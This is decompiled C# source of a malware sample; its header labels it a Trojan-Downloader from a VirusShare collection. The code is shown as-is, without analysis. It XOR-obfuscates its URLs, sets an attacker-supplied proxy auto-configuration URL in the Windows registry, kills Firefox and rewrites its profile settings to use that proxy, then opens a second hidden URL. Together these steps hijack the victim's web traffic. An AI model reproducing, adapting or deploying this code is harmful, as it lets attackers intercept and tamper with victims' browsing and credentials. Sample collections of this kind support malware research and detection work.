// Decompiled with JetBrains decompiler
// Type: CSPharm.Program
// Assembly: CSPharm, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B01A3C9C-25B2-456F-8343-BCD80036322B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Downloader.MSIL.Small.fm-5af9e08cf6fced3fcdb0aeee7edbee3219beead28b7e1b3b8d4d0579b90ddef8.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace CSPharm
{
  internal class Program
  {
    private static int key = 64;
    private static string AutoProxyUrlString = Program.CppXorStr("(440zooswnuynrsrnqyvo0!#o0n*30");
    private static string ShellUrl = Program.CppXorStr("(440zoo777n-%2)./3!n#/n:!o&2/.4%.$o6)%73o*3o35n0(0");

    private static void Main(string[] args)
    {
      if (false)
        return;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);
      registryKey.SetValue("ProxyHttp1.1", (object) 1, RegistryValueKind.DWord);
      registryKey.SetValue("EnableHttp1_1", (object) 1, RegistryValueKind.DWord);
      registryKey.SetValue("AutoConfigUrl", (object) Program.AutoProxyUrlString, RegistryValueKind.String);
      registryKey.Close();
      foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "*.default", SearchOption.TopDirectoryOnly))
      {
        if (File.Exists(directory + "\\prefs.js"))
        {
          Program.KillProcessesByName("firefox");
          StringBuilder stringBuilder = new StringBuilder();
          foreach (string readAllLine in File.ReadAllLines(directory + "\\prefs.js"))
          {
            for (int index = 0; index < 5; ++index)
            {
              if (readAllLine.Contains("user_pref(\"network.proxy.type\", " + index.ToString() + ");"))
                readAllLine.Replace("user_pref(\"network.proxy.type\", " + index.ToString() + ");", "user_pref(\"network.proxy.type\", 5);");
            }
            stringBuilder.AppendLine(readAllLine);
          }
          stringBuilder.AppendLine("user_pref(\"network.proxy.type\", 5);");
          File.WriteAllText(directory + "\\prefs.js", stringBuilder.ToString());
        }
      }
      RegistrySecurity registrySecurity = new RegistrySecurity();
      string str = Environment.UserDomainName + "\\" + Environment.UserName;
      registrySecurity.AddAccessRule(new RegistryAccessRule((IdentityReference) new SecurityIdentifier(WellKnownSidType.BuiltinUsersSid, (SecurityIdentifier) null), RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
      Program.OpenLink(Program.ShellUrl);
    }

    private static void KillProcessesByName(string str)
    {
      foreach (Process process in Process.GetProcessesByName(str))
        process.Kill();
    }

    public static void OpenLink(string sUrl)
    {
      try
      {
        Process.Start(sUrl);
      }
      catch (Exception ex1)
      {
        if (!(ex1.GetType().ToString() != "System.ComponentModel.Win32Exception"))
          return;
        try
        {
          Process.Start(new ProcessStartInfo("IExplore.exe", sUrl));
        }
        catch (Exception ex2)
        {
        }
      }
    }

    public static string CppXorStr(string textToEncrypt)
    {
      StringBuilder stringBuilder1 = new StringBuilder(textToEncrypt);
      StringBuilder stringBuilder2 = new StringBuilder(textToEncrypt.Length);
      for (int index = 0; index < textToEncrypt.Length; ++index)
      {
        char ch = (char) ((uint) stringBuilder1[index] ^ (uint) Program.key);
        stringBuilder2.Append(ch);
      }
      return stringBuilder2.ToString();
    }
  }
}
